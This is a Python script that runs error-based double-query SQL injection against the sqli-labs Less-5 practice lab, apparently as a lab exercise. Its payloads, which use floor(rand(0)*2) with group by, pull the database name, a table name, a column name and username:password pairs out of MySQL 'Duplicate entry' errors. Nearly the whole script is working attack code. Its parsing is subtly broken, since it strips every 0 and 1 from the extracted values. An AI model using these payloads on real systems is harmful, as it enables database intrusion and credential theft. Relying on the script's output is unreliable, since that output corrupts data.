#!/usr/bin/env python3
import requests
from urllib.parse import quote
import re

base_url = "http://localhost/sqli-labs/Less-5/"

print("=== Testing Less-5 using floor() + rand() method ===\n")

# Test floor() + rand() + group by
print("1. Extract database name:")
payload = "1' and (select 1 from(select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)--+"
r = requests.get(f"{base_url}?id={quote(payload)}")

# Look for data in Duplicate entry
dup_match = re.search(r"Duplicate entry '([^']+)'", r.text)
if dup_match:
    db_name = dup_match.group(1).replace('0', '').replace('1', '')
    print(f"✅ Database name: {db_name}")
    print(f"   Full error: {dup_match.group(0)}")
else:
    print("❌ Duplicate entry not found")
    print(f"Response length: {len(r.text)}")
    # Print the part of the response containing "Duplicate" or "error"
    if "error" in r.text.lower():
        error_start = r.text.lower().find("error")
        print(f"Error snippet: {r.text[error_start:error_start+200]}")

print("\n2. Extract all table names:")
payload = "1' and (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+"
r = requests.get(f"{base_url}?id={quote(payload)}")
dup_match = re.search(r"Duplicate entry '([^']+)'", r.text)
if dup_match:
    table_name = dup_match.group(1).replace('0', '').replace('1', '')
    print(f"✅ Table name: {table_name}")

print("\n3. Extract column names:")
payload = "1' and (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_name='users' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+"
r = requests.get(f"{base_url}?id={quote(payload)}")
dup_match = re.search(r"Duplicate entry '([^']+)'", r.text)
if dup_match:
    col_name = dup_match.group(1).replace('0', '').replace('1', '')
    print(f"✅ Column name: {col_name}")

print("\n4. Extract user data:")
payload = "1' and (select 1 from(select count(*),concat((select concat(username,':',password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+"
r = requests.get(f"{base_url}?id={quote(payload)}")
dup_match = re.search(r"Duplicate entry '([^']+)'", r.text)
if dup_match:
    user_data = dup_match.group(1).replace('0', '').replace('1', '')
    print(f"✅ User data: {user_data}")

print("\n=== Test complete ===")
print("✅ Double Query injection (floor() + rand()) method is working!")
